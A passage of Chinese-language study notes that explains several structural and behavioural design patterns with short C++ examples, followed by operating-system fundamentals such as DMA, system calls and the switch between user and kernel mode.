		GenMidCode genMidCode;
		GenMachineCode genMachineCode;
		scanner.Scan();
		parser.Parse();
		genMidCode.GenCode();
		genMachineCode.GenCode();
	}
};
```

#### 优缺点

优点：

- 可以让自己的代码独立于复杂子系统。

缺点：

- 外观可能称为程序中所有类都耦合的上帝对象（一个了解过多或者负责过多的对象）。

### 享元模式（Flyweight）

**享元模式**是一种结构型设计模式， 它摒弃了在每个对象中保存所有数据的方式， 通过共享多个对象所共有的相同状态， 让你能在有限的内存容量中载入更多对象。

#### 解决方案

对象的常量数据通常被称为内在状态，其位于对象中，其他对象只能读取但不能修改其数值。而数值的其他状态常常能被其他对象“从外部”改变，因此被称为外在状态。

享元模式建议不在对象中存储外在状态， 而是将其传递给依赖于它的一个特殊方法。 程序只在对象中保存内在状态， 以方便在不同情景下重用。 这些对象的区别仅在于其内在状态 （与外在状态相比， 内在状态的变体要少很多）， 因此你所需的对象数量会大大削减。

将仅存储内在状态的对象称为**享元**。

外在状态在大部分情况下，都会被移动到容器对象中，也就是我们应用享元模式前的聚合对象中。

为了能更方便的访问各种享元，可以创建一个工厂方法来管理已有享元对象的缓存池。

#### 享元模式结构

- **享元模式只是一种优化**。在应用该模式之前，要确定程序中存在于大量类似对象同时占用内存相关的内存消耗问题，并且确保该问题无法使用其他更好的方式来解决。
- **享元（Flyweight）**：包含原始对象中部分能在多个对象中共享的状态。同一个享元对象可在许多不同情境中使用。享元中存储的状态被称为“内在状态”。传递给享元方法的状态被称为“外在状态”。
- **情景（context）**：包含原始对象中各不相同的外在状态。情景与享元对象组合在一起就能表示原始对象的全部状态。
- 通常情况下，原始对象的行为会保留在享元类中。因此调用享元方法必须提供部分外在状态作为参数。但可以将行为移动到情景类中，然后将连入的享元作为单纯的数据对象。
- **客户端（Client）**：负责计算或者存储享元的外在状态。在客户端来看，享元是一种可在运行时进行配置的模板对象，具体的配置方式为向其方法中传入一些情景数据参数。
- **享元工厂（Flyweight Factory）**：会对已有享元的缓存池进行管理。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\cache.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **仅在程序必须支持大量对象且没有足够的内存容量时使用享元模式。**
- 应用该模式所获的收益大小取决于使用它的方式和情景，在下列情况中最有用：
  - 程序需要生成数量巨大的相似对象
  - 将耗尽目标设备的所有内存
  - 对象中包含可抽取且能在多个对象间共享的重复状态。

#### 实现方式

- 将需要改写为享元的类成员变量拆分为两个部分：
  - 内在状态： 包含不变的、 可在许多对象中重复使用的数据的成员变量。
  - 外在状态： 包含每个对象各自不同的情景数据的成员变量
- 保留类中表示内在状态的成员变量， 并将其属性设置为不可修改。 这些变量仅可在构造函数中获得初始数值。
- 找到所有使用外在状态成员变量的方法， 为在方法中所用的每个成员变量新建一个参数， 并使用该参数代替成员变量。
- 你可以有选择地创建工厂类来管理享元缓存池， 它负责在新建享元时检查已有的享元。 如果选择使用工厂， 客户端就只能通过工厂来请求享元， 它们需要将享元的内在状态作为参数传递给工厂。
- 客户端必须存储和计算外在状态 （情景） 的数值， 因为只有这样才能调用享元对象的方法。 为了使用方便， 外在状态和引用享元的成员变量可以移动到单独的情景类中。

#### 代码实现

例子：以树为例

```c++
class TreeType{
private:
    string m_name;
    string m_color;
    string m_texture;
public:
    TreeType(string name, string color, string texture): m_name(name), m_color(color), m_texture(texture){
        cout << "construct with " << name << " " << color << " " << texture << endl;
    }
    void draw(int x, int y){
            cout<< "TreeType Draw at (" << x << "," << y << ")" << endl;
    }
};

class TreeFactory{
public:
    map<string, TreeType> treeTypes;
    TreeType getTreeType(string name, string color, string texture){
        map<string, TreeType>::iterator typeIter = treeTypes.find(name + color + texture);
        if(typeIter == treeTypes.end()){
            TreeType type(name, color, texture);
            treeTypes.insert(make_pair(name+color+texture, type));
            return type;
        }
        return typeIter->second;
    }
};

class Tree{
private:
    int x, y;
    TreeType type;

public:
    Tree(int _x, int _y, TreeType _type) : x(_x), y(_y), type(_type){}
    void draw(){
        type.draw(x, y);
    }
};

void plantTrees(int x, int y, string name, string color, string texture, TreeFactory& treeFactory, vector<Tree>& trees){
    TreeType type = treeFactory.getTreeType(name, color, texture);
    Tree tree(x, y, type);
    trees.push_back(tree);
}
```

#### 优缺点

优点：

- 如果程序中有很多相似的对象，那么将可以节省大量内存

缺点：

- 可能需要牺牲执行速度来换取内存，因为每次调用享元方法时都需要重新计算部分情景数据
- 代码会变得复杂

### 代理模式（Proxy）

**代理模式**是一种结构型设计模式， 让你能够提供对象的替代品或其占位符。 代理控制着对于原对象的访问， 并允许在将请求提交给对象前后进行一些处理。

#### 解决方案

代理模式建议新建一个与原服务对象接口相同的代理类，然后更新应用将代理对象传递给素有原始对象客户端。代理类收到客户端请求后会创建实际的服务对象，并将所有工作委派给他。

比如代理将自己伪装成数据库对象，可以在客户端或者实际数据库对象不知情的情况下处理延迟初始化和缓存查询结果的工作。

#### 代理模式结构

- **服务接口（service interface）**：声明了服务接口，代理必须遵循该接口才能伪装成服务对象。
- **服务（service）**：提供了一些实用的业务逻辑
- **代理（Proxy）**：包含一个指向服务对象的引用成员变量。代理完成其任务后会将请求传毒给服务对象。
- **客户端（Client）**：能通过统一接口与服务或者代理进行交互。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\proxy.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **延迟初始化（虚拟代理）。如果有一个偶尔使用的重量级服务对象，一致保持该对象余小宁会消耗系统资源时，可以使用代理模式。**
- **访问控制（保护代理）**。如果希望特定客户端使用服务对象，这里的对象可以是操作系统中非常重要的部分，而客户端则是已经启动的程序（包括恶意程序），此时可以使用代理模式。
- **本地执行远程服务（远程代理）**。是用于服务对象位于远程服务器上的情形。
- **记录日志请求（日志记录代理）**。是用于需要保存对于服务对象的请求历史记录时。代理可以向服务传递请求前进行记录。
- **智能引用**。可以在没有客户端使用某个重量级对象时历史销毁该对象。

#### 实现方式

- 如果没有现成的服务接口，需要创建一个接口来实现代理和服务对象的可交换性。
- 创建代理类，其中必须包含一个存储指向服务的引用的成员变量。
- 根据需求实现代理方法。
- 可以考虑新建一个构建方法来判断客户端可获取的是代理还是实际服务。
- 可以考虑为服务对象实现延迟初始化。

#### 代码实现

例如：一个可以在文档中嵌入图形对象的文档编辑器。有些图形的创建开销很大，因此可以创建一个图像代理，先不打开图形，需要打开的时候再打开

```
class Image{
public:
	Image(string name) : m_imageName(name){}
	virtual ~Image(){}
	virtual void Show(){}
protected:
	string m_imageName;
};
class BigImage: public Image{
public:
	BigImage(string name): Image(name){}
	~BigImage(){}
	void Show(){cout << "Show Big Image" << m_imageName << endl;}
};
class BigImageProxy: public Image{
private:
	BigImage *m_bigImage;
public:
	BigImageProxy(string name) : Image(name), m_bigImage(0){}
	~BigImageProxy(){delete m_bigImage;}
	void Show(){
		if(m_bigImage == NULL)
			m_bigImage = new BigImage(m_imageName);
		m_bigImage->Show();
	}
}
int main(){
	Image *image = new BigImageProxy("proxy.jpg");
	image->Show();
	delete image;
	return 0;
}
```

## 行为模式

### 责任链模式（职责链模式，Chain of Responsibility）

**责任链模式**是一种行为设计模式， 允许你将请求沿着处理者链进行发送。 收到请求后， 每个处理者均可对请求进行处理， 或将其传递给链上的下个处理者。

#### 解决方案

与许多其他行为设计模式一样， **责任链**会将特定行为转换为被称作*处理者*的独立对象。 

模式建议你将这些处理者连成一条链。 链上的每个处理者都有一个成员变量来保存对于下一处理者的引用。 除了处理请求外， 处理者还负责沿着链传递请求。 请求会在链上移动， 直至所有处理者都有机会对其进行处理。

处理者可以决定不再沿着链传递请求， 这可高效地取消所有后续处理步骤。

#### 责任链模式结构

- **处理者（Handler）**声明了所有具体处理者的通用接口。该接口通常仅包含单个方法用于请求处理，但有时其还会包含一个设置链上下个处理者的方法。
- **基础处理者（Base Handler）**：是一个可选的类，可以将所有处理者共同的样本代码放置在这里。
- **具体处理者（Concrete Handler）**：包含处理请求的实际代码，每个处理者接收到请求后，都必须决定是否进行处理，以及是否沿着链传递请求。处理者通常是独立且不可变的，需要通过构造函数一次性的获取所有必要的数据。
- **客户端（Client）**：可根据程序逻辑一次性或者动态的生成链。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\chainofresponsibility.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- 当程序需要使用不同方式处理不同种类请求，而且请求类型和顺序预先未知时，可以使用责任链模式。
- 迪桑必须按照顺序执行多个处理者时，可以使用该模式
- 如果所需处理者及其顺序必须在运行时可以进行改变，可以使用该模式

#### 实现方式

- 声明处理者接口并描述请求处理方法的签名。
- 为了在具体处理者中消除重复的样本代码， 你可以根据处理者接口创建抽象处理者基类。
- 依次创建具体处理者子类并实现其处理方法。 每个处理者在接收到请求后都必须做出两个决定：
  - 是否自行处理这个请求。
  - 是否将该请求沿着链进行传递。
- 客户端可以自行组装链， 或者从其他对象处获得预先组装好的链。 在后一种情况下， 你必须实现工厂类以根据配置或环境设置来创建链。
- 客户端可以触发链中的任意处理者， 而不仅仅是第一个。 请求将通过链进行传递， 直至某个处理者拒绝继续传递， 或者请求到达链尾。
- 由于链的动态性，客户端需要准备好以下情况：
  - 链中可能只有单个链接。
  - 部分请求可能无法到达链尾。
  - 其他请求可能直到链尾都未被处理。

#### 代码实现

例如：员工要求加薪，需要一层一层批准

```
class Manager{
protected:
	Manager *m_manager;
	string m_name;
public:
	Manager(Manager *manager, string name): m_manager(manager), m_name(name){}
	virtual void DealWithRequest(string name, int num){}
};
class CommonManager: public Manager{
public:
	CommonManager(Manager *manager, string name): Manager(manager, name){}
	void DealWithRequest(string name, int num){
		if(num < 500)
			cout << "commonmanager " << name << " accept " << "raises $" << num << endl;
		else{
			cout << "commonmanager cannot deal" << endl;
			m_manager->DealWithRequest(name, num);
		}
	}
};
class MajorManager: public Manager{
public:
	MajorManager(Manager *manager, string name): Manager(manager, name){}
	void DealWithRequest(string name, int num){
		if(num < 1000)
			cout << "majormanager " << name << " accept " << "raises $" << num << endl;
		else{
			cout << "majormanager cannot deal" << endl;
			m_manager->DealWithRequest(name, num);
		}
	}
};
class GeneralManager: public Manager{
public:
	GeneralManager(Manager *manager, string name): Manager(manager, name){}
	void DealWithRequest(string name, int num){
		cout << "generalmanager " << name << " accept " << "raises $" << num << endl;
	}
};

int main(){
	Manager *general = new GeneralManager(NULL, "A");
	Manager *major = new MajorManager(general, "B");
	Manager *common = new CommonManager(major, "C");
	common->DealWithRequest("D", 300);
	common->DealWithRequest("E", 1000);
	delete general;
	delete major;
	delete common;
	return 0;
}
```

#### 优缺点

优点：

- 可以控制请求处理的顺序
- *单一职责原则*。 你可对发起操作和执行操作的类进行解耦。
-  *开闭原则*。 你可以在不更改现有代码的情况下在程序中新增处理者。

缺点：

- 部分请求可能未被处理

### 中介者模式（Mediator）

**中介者模式**是一种行为设计模式， 能让你减少对象之间混乱无序的依赖关系。 该模式会限制对象之间的直接交互， 迫使它们通过一个中介者对象进行合作。

#### 解决方案

中介者模式建议你停止组件之间的直接交流并使其相互独立。 这些组件必须调用特殊的中介者对象， 通过中介者对象重定向调用行为， 以间接的方式进行合作。 最终， 组件仅依赖于一个中介者类， 无需与多个其他组件相耦合。

采用这种方式， 中介者模式让你能在单个中介者对象中封装多个对象间的复杂关系网。 类所拥有的依赖关系越少， 就越易于修改、 扩展或复用。

#### 中介者模式结构

- **组件（Component）**：各种包含业务逻辑的类，每个组件都有一个指向中介者的引用，该引用被声明为中介者接口类型。组件不知道中介者实际所属的类。因此可以通过将其连接到不同的中介者以使其能在其他程序中复用。
- **中介者（Mediator）**：接口声明了与组件交流的方法，但通常仅包括一个通知方法。组件可将任意上下文（包括自己的对象）作为该方法的参数，只有这样接收组件和发送者类之间才不会耦合。
- **具体中介者（Concrete Mediator）**：封装了多种组件间的关系。具体中介者通常会保存所有组件的引用并对其进行管理，甚至有时会对其生命周期进行管理。
- 组件并不知道其他组建的情况，如果组件内发生了重要事件，他只能通知中介者，中介者收到通知后能轻易地确定发送者，这足以判断接下来需要触发的组件了。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\mediator.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- 当一些对象和其他对象紧密耦合以致难以对其进行修改时，可以使用中介者模式
- 当组件过于依赖其他组件而无法在不同应用中复用时，可以使用中介者模式
- 如果为了能在不同情景下复用一些基本行为，导致需要被迫创建大量组件子类时，可以使用中介者模式

#### 实现方式

- 找到一组当前紧密耦合， 且提供其独立性能带来更大好处的类
- 声明中介者接口并描述中介者和各种组件之间所需的交流接口。 
- 实现具体中介者类。 
- 可以更进一步让中介者负责组件对象的创建和销毁。 
- 组件必须保存对于中介者对象的引用。 该连接通常在组件的构造函数中建立， 该函数会将中介者对象作为参数传递。
- 修改组件代码， 使其可调用中介者的通知方法， 而非其他组件的方法。 然后将调用其他组件的代码抽取到中介者类中， 并在中介者接收到该组件通知时执行这些代码。

#### 代码实现

例如：租房为例，如果没有房屋中介，那么房客要自己找房东，房东要自己找房客。

```c++
class Mediator;
class Person{
portected:
	Mediator *m_mediator;
public:
	virtual void SetMediator(Mediator *mediator){}
	virtual void SendMessage(string msg){}
	virtual void GetMessage(string msg){}
};
class Mediator{
public:
	virtual void Send(string msg, Person *person){}
	virtual void SetA(Person *A){}
	virtual void SetB(Person *B){}
};
class Renter: public Person{
public:
	void SetMediator(Mediator *mediator){m_mediator = mediator;}
	void SendMessage(string msg){m_mediator->Send(msg, this);}
	void GetMessage(string msg){cout << "renter get msg" << endl;}
};
class Landlord: public Person{
public:
	void SetMediator(Mediator *mediator){m_mediator = mediator;}
	void SendMessage(string msg){m_mediator->Send(msg, this);}
	void GetMessage(string msg){cout << "landlord get msg" << endl;}
};
class HouseMediator: public Mediator{
private:
	Person *m_A;
	Person *m_B;
public:
	HouseMediator(): m_A(NULL), m_B(NULL){}
	void SetA(Person *A){m_A = A;}
	void SetB(Person *B){m_B = B;}
	void Send(string msg, Person *person){
		if(person == m_A)
			m_B->GetMessage(msg);
		else
			m_A->GetMessage(msg);
	}
};
```

#### 优缺点

优点：

- *单一职责原则*。 你可以将多个组件间的交流抽取到同一位置， 使其更易于理解和维护。
-  *开闭原则*。 你无需修改实际组件就能增加新的中介者。
-  你可以减轻应用中多个组件间的耦合情况。
-  你可以更方便地复用各个组件。

缺点：

- 一段时候后，中介者 可能会演化为上帝对象。

### 观察者模式（Observer）

**观察者模式**是一种行为设计模式， 允许你定义一种订阅机制， 可在对象事件发生时通知多个 “观察” 该对象的其他对象。

#### 解决方案

拥有一些值得关注的状态的对象通常被称为*目标*， 由于它要将自身的状态改变通知给其他对象， 我们也将其称为*发布者* （publisher）。 所有希望关注发布者状态变化的其他对象被称为*订阅者* （subscribers）。

观察者模式建议为发布者类添加订阅机制，让每个对象都能订阅或者取消订阅发布者消息流。

实际上，该机制包括：1，一个用于存储订阅者对象引用的列表成员变量；2，几个用于添加或者删除该列表中订阅者的公有方法。

#### 观察者模式结构

- **发布者（Publisher）**：会向其他对象发送值得关注的事件。
- 当新事件发生时，发送者会遍历订阅列表并调用每个订阅者对象的通知方法，该方法是在订阅者接口中声明的。
- **订阅者（Subscriber）**：接口声明了通知接口。在绝大多数情况下，该接口仅包含一个更新方法。该方法可以拥有多个参数，使发布者能在更新时传递事件的详细参数。
- **具体订阅者（Concrete Subscriber）**：可以执行一些操作来回应发布者的通知。
- 订阅者通常需要一些上下文信息来正确的处理更新，因此发布这通常会将一些上下文数据作为通知方法的参数进行传递。
- **客户端（Client）**：分别创建发布者和订阅者对象，然后为订阅者注册发布者更新。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\mediator.png" alt="img" style="zoom:80%;" />
</div>



#### 应用场景

- 当一个对象状态的改变需要改变其他对象，或者实际对象是事先未知的或者动态变化的时，可以使用观察者模式。
- 当应用中的一些对象必须观察其他对象时，可以使用观察者模式。但仅能在有限时间内或者特定情况下使用。

#### 实现方式

- 仔细检查你的业务逻辑， 试着将其拆分为两个部分： 独立于其他代码的核心功能将作为发布者； 其他代码则将转化为一组订阅类。
- 声明订阅者接口。 该接口至少应声明一个 `update`方法。
- 声明发布者接口并定义一些接口来在列表中添加和删除订阅对象。 记住发布者必须仅通过订阅者接口与它们进行交互。
- 确定存放实际订阅列表的位置并实现订阅方法。
- 创建具体发布者类。 
- 在具体订阅者类中实现通知更新的方法。
- 客户端必须生成所需的全部订阅者， 并在相应的发布者处完成注册工作。

#### 代码实现

例如：博主和读者的问题

```c++
class Observer{
public:
	Observer(){}
	virtual ~Observer(){}
	virutal void Update(){}
};
class Blog{
public:
	Blog(){}
	~Blog(){}
	void Attach(Observer *observer){m_observers.push_back(observer);}
	void Remove(Observer *observer){m_observers.remove(observer);}
	void Notify(){
		list<Observer*>::iterator iter = m_observers.begin();
		for(; iter != m_observers.end(); iter++)
			(*iter)->Update();
	}
	virtual void SetStatus(string s){m_status = s;}
	virtual string GetStatus(){return m_status;}
private:
	list<Observer*> m_observers;
protected:
	stdring m_status;
};
class BlogCSDN: public Blog{
private:
	string m_name;
public:
	BlogCSDN(string name): m_name(name){}
	~BlogCSDN(){}
	void SetStatus(string s){m_status="CSDN message: "+m_name+s;}
	string GetStatus(){return m_status;}
};
class ObserverBlog: public Observer{
private:
	string m_name;
	Blog *m_blog;
public:
	ObserverBlog(string name, Bolg *blog): m_name(name), m_blog(blog){}
	~ObserverBolg(){}
	void Update(){
		string status = m_blog->GetStatus();
		cout << m_name << "--------" << status << endl;
	}
};
```

#### 优缺点

优点：

- *开闭原则*。 你无需修改发布者代码就能引入新的订阅者类 （如果是发布者接口则可轻松引入发布者类）。
-  你可以在运行时建立对象之间的联系。

缺点：

- 订阅者的通知顺序是随机的。

### 迭代器模式（Iterator）

迭代器模式是一种行为设计模式，让你能在不暴露集合底层表现形式（列表、栈和树等）的情况下遍历集合中所有的元素。

#### 解决方案

迭代器模式的主要思想就是将集合的遍历行为抽取为单独的迭代器模式。

#### 迭代器模式结构

![迭代器设计模式的结构](..\assets\post\others\iterator.png)

- **迭代器**接口声明了遍历集合所需的操作：获取下一个元素，获取当前位置和重新开始迭代等
- **具体迭代器**实现了遍历集合的一种特定算法。迭代器对象必须跟踪自身遍历的进度。这使得多个迭代器客户相互独立的遍历同一个集合。
- **集合**接口声明一个或者多个方法来获取于集合兼容的迭代器，请注意，返回方法的类型必须被声明为迭代器接口，因此具体集合可以返回各种 不同种类的迭代器。
- **具体集合**会在客户端请求迭代器时返回一个特定的具体迭代器类实体。
- **客户端**通过集合和迭代器的接口与两者进行交互。这样一个客户端无需与具体类进行耦合，允许同一个客户端代码使用各种不同的集合和迭代器。

#### 应用场景

- 当集合背后为复杂的数据结构，并且希望对客户端隐藏其复杂性时（出于使用便利性或者安全性考虑），可以使用迭代器模型
- 使用该模式可以减少程序中重复的代码
- 如果希望代码能够遍历不同的甚至是无法预知的数据机构，可以使用迭代器模式

#### 实现方式

- 声明迭代器接口，该接口必须提供至少一个方法来获取集合中的下个元素。但为了使用方便，还可以使用方便，还可以添加一些其他方法。
- 声明集合接口并描述一个获取迭代器的方法。其返回值必须是迭代器接口。
- 为希望使用迭代器进行遍历的集合实现具体迭代器类。迭代器对象必须与单个集合实体链接。链接关系通常通过迭代器的构造函数建立
- 在你的集合类中实现集合接口。主要思想是针对特定集合为客户端代码提供创建迭代器的快捷方式。
- 检查客户端代码，使用迭代器替换所有集合遍历函数。

#### 优缺点

- 单一职责原则。通过将体积庞大的遍历算法代码抽取为独立的类，可以对客户端代码和集合进行整理
- 开闭原则。可以实现新型的集合和迭代器并将其传递给现有代码，无需修改现有代码
- 可以并行遍历同一集合，因为每个迭代器对象都包含其自身的遍历状态

缺点：

- 如果程序只与简单的集合进行交互，该模式可能矫枉过正
- 对于某些特殊的集合，使用迭代器可能比直接遍历的效率低。

# 操作系统基础

## 基本特征

### 并发和并行

- 并发是指宏观上在一段时间内能同时运行多个程序，而并行是指在同一时刻可以同时运行多个指令
- 操作系统通过引入进程和线程，使得程序能够并发运行
- 并行需要硬件支持，如多流水线、多核处理器或者分布式计算系统

### 共享

- 共享是指系统中的资源可以被多个并发进程共同使用
- 共享的方式有两种：**互斥共享和同时共享**
- 互斥共享的资源称为临界资源；例如打印机等，在同一时刻只允许一个进程访问，需要用同步机制来实现互斥访问

### 虚拟

- 虚拟技术把一个物理实体转换为多个逻辑实体
- 虚拟技术主要有两种：时（时间）分复用技术和空（空间）分复用技术
- 多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占用处理器，每次只执行一小个时间片并快速切换
- 虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间的页被映射到物理内存，地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行**页面置换算法**，将该页置换到内存中

### 异步

- 异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进

## 基本功能

- **进程管理**：进程控制、进程同步、进程通信、死锁处理、处理机调度等
- **内存管理**：内存分配、地址映射、内存保护与共享、虚拟内存等
- **文件管理**：文件存储空间的管理、目录管理、文件读写管理和保护等
- **设备管理**：完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率，主要包括缓冲管理、设备分配、设备处理、虚拟设备等
- **提供用户接口**：操作系统提供了访问应用程序和硬件的接口，使用户能够通过应用程序发起系统调用从而操纵硬件，实现想要的功能。

### 软件访问硬件的几种方式

软件访问硬件其实就是一种 IO 操作，软件访问硬件的方式，也就是 I/O 操作的方式有哪些。

硬件在 I/O 上大致分为**并行和串行**，同时也对应串行接口和并行接口。

随着计算机技术的发展，I/O 控制方式也在不断发展。选择和衡量 I/O 控制方式有如下三条原则

> （1） 数据传送速度足够快，能满足用户的需求但又不丢失数据；
>
> （2） 系统开销小，所需的处理控制程序少；
>
> （3） 能充分发挥硬件资源的能力，使 I/O 设备尽可能忙，而 CPU 等待时间尽可能少。

根据以上控制原则，I/O 操作可以分为四类

- `直接访问`：直接访问由用户进程直接控制主存或 CPU 和外围设备之间的信息传送。直接程序控制方式又称为忙/等待方式。
- `中断驱动`：为了减少程序直接控制方式下 CPU 的等待时间以及提高系统的并行程度，系统引入了中断机制。中断机制引入后，外围设备仅当操作正常结束或异常结束时才向 CPU 发出中断请求。在 I/O 设备输入每个数据的过程中，由于无需 CPU 的干预，一定程度上实现了 CPU 与 I/O 设备的并行工作。

上述两种方法的特点都是以 `CPU` 为中心，数据传送通过一段程序来实现，软件的传送手段限制了数据传送的速度。接下来介绍的这两种 I/O 控制方式采用硬件的方法来显示 I/O 的控制

- `DMA 直接内存访问`：为了进一步减少 CPU 对 I/O 操作的干预，防止因并行操作设备过多使 CPU 来不及处理或因速度不匹配而造成的数据丢失现象，引入了 DMA 控制方式。

  DMA是指外部设备不通过CPU而直接与系统内存交换数据的接口技术。 
  　　要把外设的数据读入内存或把内存的数据传送到外设，一般都要通过CPU控制完成，如CPU程序查询或中断方式。利用中断进行数据传送，可以大大提高CPU的利用率。 
  　　但是采用中断传送有它的缺点，对于一个高速I/O设备，以及批量交换数据的情况，只能采用DMA方式，才能解决效率和速度问题。DMA在外设与内存间直接进行数据交换，而不通过CPU，这样数据传送的速度就取决于存储器和外设的工作速度。 
  　　通常系统的总线是由CPU管理的。在DMA方式时，就希望CPU把这些总线让出来，即CPU连到这些总线上的线处于第三态–高阻状态，而由DMA控制器接管，控制传送的字节数，判断DMA是否结束，以及发出DMA结束信号。DMA控制器必须有以下功能： 

  　　1. 能向CPU发出系统保持（HOLD）信号，提出总线接管请求； 
  　　2. 当CPU发出允许接管信号后，负责对总线的控制，进入DMA方式； 
  　　3. 能对存储器寻址及能修改地址指针，实现对内存的读写操作； 
  　　4. 能决定本次DMA传送的字节数，判断DMA传送是否结束 
  　　5. 发出DMA结束信号，使CPU恢复正常工作状态。 

- `通道控制方式`：通道，独立于 CPU 的专门负责输入输出控制的处理机，它控制设备与内存直接进行数据交换。有自己的通道指令，这些指令由 CPU 启动，并在操作结束时向 CPU 发出中断信号。**优点：**通道控制方式解决了I/O操作的独立性和各部件工作的并行性。把CPU从繁琐的输入/输出操作中解放出来。采用通道技术后，不仅能实现CPU和通道的并行操作，而且通道与通道之间也能实现并行操作，各通道上的外设也能实现并行操作，从而可提高整个系统的效率。**缺点：**由于需要更多硬件（通道处理器），因此其成本较高。通道控制方式通常应用于大型数据交互的场合。

- **通道控制方式与DMA控制方式的区别：**（1）DMA控制方式中需要CPU来控制所传输数据块的大小，传输的内存地址；通道控制方式中这些信息都是由通道来控制管理的。（2）一个DMA控制器对应一台设备与内存传递数据，而一个通道可以控制多台设备与内存的数据交换。

-  I/O通道与一般处理器的区别：I/O通道的指令类型单一，其所能执行的命令主要局限于与I/O操作有关的指令；通道没有自己的内存，通道所执行的通道程序放在主机的内存中，也就是说通道是与CPU共享内存的。

## 系统调用

如果一个进程在用户态需要使用内核态功能，就进行系统调用从而陷入内核态，之后由操作系统代为完成。

系统调用的执行过程： 当CPU执行程序中编写的由访管指令(supervisor, 也称自陷指令(trap)或中断指令(interrupt), 指引起处理器中断的机器指令)实现的系统调用时会产生异常信号，通过陷阱机制(也称异常处理机制，当异常或中断发生时，处理器捕捉到一个执行线程，并且将控制权转移到操作系统中某一个固定地址的机制)，处理器的状态由用户态(user mode, 又称目态或普通态)转变为核心态(kerbel mode, 又称管态或内核态)，进入操作系统并执行相应服务例程，以获得操作系统服务。当系统调用执行完毕时，处理器再次切换状态，控制返回至发出系统调用的程序。

系统调用是应用程序获得操作系统服务的唯一途径。

系统调用的作用： 

1. 内核可以基于权限和规则对资源访问进行裁决，保证系统的安全性。 
2. 系统调用对资源进行抽象，提供一致性接口，避免用户在使用资源时发生错误，且编程效率大大提高。

系统调用与函数调用的区别： 

1. 调用形式和实现方式不同。功能号 VS 地址； 用户态转换到内核态 VS 用户态。 
2. 被调用代码的位置不同。 动态调用 + 操作系统 VS 静态调用 + 用户级程序。 
3. 提供方式不同。 操作系统 VS 编程语言。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-02-10\systemcall.png" alt="img" style="zoom:60%;" />
</div>


- 工作流程为：
  - 用户态程序将一些数据值放在寄存器中，或者使用参数创建一个栈帧(stack frame), 以此表明需要操作系统提供的服务
  - 用户态程序执行陷阱指令（Trap Instruction，系统调用在CPU中的实现）
  - CPU切换到内核态, 并跳到位于内存指定位置的指令, 这些指令是操作系统的一部分, 他们具有内存保护, 不可被用户态程序访问
  - 这些指令称之为陷阱(trap)或者系统调用处理器(system call handler). 他们会读取程序放入内存的数据参数, 并执行程序请求的服务
  - 系统调用完成后, 操作系统会重置CPU为用户态并返回系统调用的结果
- Linux的系统调用功能主要有：
  - 进程控制：`fork();exit();wait()`
  - 进程通信：`pipe();shmget();mmap()`
  - 文件操作：`open();read();write()`
  - 设备操作：`ioctl();read();write()`
  - 信息维护：`getpid();alarm();sleep()`
  - 安全：`chmod();umask();chown()`

### 用户态和内核态

- 内核态：CPU可以访问内存的所有数据，包括外围设备，CPU也可以将自己从一个程序切换到另一个程序
- 用户态：只能受限的访问内存，且不允许访问外围设备，占用CPU的能力被剥夺，CPU资源可以被其他程序获取
- 切换的三种方式：**系统调用**（用户进程主动）、中断（被动）、外围设备中断（被动）
  - 中断：当CPU在用户态下运行时发生一些没有预知的异常，这会触发由当前运行进程切换到处理此异常的内核相关进程中，也就是切换到内核态，比如缺页异常
  - 外围设备中断：当外围设备完成用户请求操作后，会向CPU发出相应的中断信号，这时CPU会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换
- 用户态切换到内核态的步骤：
  - 从当前进程的描述符中提取其内核栈的`ss0`和`esp0`信息
  - 使用`ss0`和`esp0`指向的内核栈将当前进程的`cs,eip,eflags,ss,esp`信息保存起来，这个过程也完成了用户栈到内核栈的切换过程，同时保存了被暂停执行的程序的下一条指令
  - 将先前由中断向量检索得到的中断处理程序的`cs,eip`信息装入相应的寄存器，开始执行中断处理程序，这时就转到了内核态的程序执行了

### 用户态和内核态是如何切换的？

所有的用户进程都是运行在用户态的，但是我们上面也说了，用户程序的访问能力有限，一些比较重要的比如从硬盘读取数据，从键盘获取数据的操作则是内核态才能做的事情，而这些数据却又对用户程序来说非常重要。所以就涉及到两种模式下的转换，即**用户态 -> 内核态 -> 用户态**，而唯一能够做这些操作的只有 `系统调用`，而能够执行系统调用的就只有 `操作系统`。

一般用户态 -> 内核态的转换我们都称之为 trap 进内核，也被称之为 `陷阱指令(trap instruction)`。

他们的工作流程如下：

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2b6ab407a3294608a04bf7b7767c807a~tplv-k3u1fbpfcp-watermark.awebp)

- 首先用户程序会调用 `glibc` 库，glibc 是一个标准库，同时也是一套核心库，库中定义了很多关键 API。
- glibc 库知道针对不同体系结构调用`系统调用`的正确方法，它会根据体系结构应用程序的二进制接口设置用户进程传递的参数，来准备系统调用。
- 然后，glibc 库调用`软件中断指令(SWI)` ，这个指令通过更新 `CPSR` 寄存器将模式改为超级用户模式，然后跳转到地址 `0x08` 处。
- 到目前为止，整个过程仍处于用户态下，在执行 SWI 指令后，允许进程执行内核代码，MMU 现在允许内核虚拟内存访问
- 从地址 0x08 开始，进程执行加载并跳转到中断处理程序，这个程序就是 ARM 中的 `vector_swi()`。
- 在 vector_swi() 处，从 SWI 指令中提取系统调用号 SCNO，然后使用 SCNO 作为系统调用表 `sys_call_table` 的索引，调转到系统调用函数。
- 执行系统调用完成后，将还原用户模式寄存器，然后再以用户模式执行。

### 用户栈和核心栈

